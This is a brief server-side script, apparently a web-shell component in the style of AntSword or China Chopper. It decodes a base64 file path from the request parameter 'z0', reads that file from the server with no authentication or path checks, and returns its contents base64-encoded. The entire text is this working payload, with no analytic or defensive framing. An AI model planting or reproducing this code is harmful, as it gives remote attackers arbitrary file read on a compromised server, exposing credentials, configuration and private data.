<%

var paramMap = request.getParameterMap();
var szFilePath = "";

if (paramMap.containsKey("z0")) {
    var b64Path = paramMap.get("z0")[0];
    if (b64Path != null && b64Path != "") {
        szFilePath = new java.lang.String(java.util.Base64.getDecoder().decode(b64Path), "UTF-8");
    }
}

if (szFilePath == "") {
    echo("ERROR://File path is empty.");
} else {
    try {
        var path = java.nio.file.Paths.get(szFilePath);
        
        if (!java.nio.file.Files.exists(path)) {
            throw new java.io.FileNotFoundException("File does not exist.");
        }
        if (java.nio.file.Files.isDirectory(path)) {
            throw new java.io.IOException("Target path is a directory, not a file.");
        }

        var fileBytes = java.nio.file.Files.readAllBytes(path);
        var b64Result = java.util.Base64.getEncoder().encodeToString(fileBytes);

        echo(b64Result);

    } catch (e) {
        echo("ERROR://" + e.message);
    }
}

%>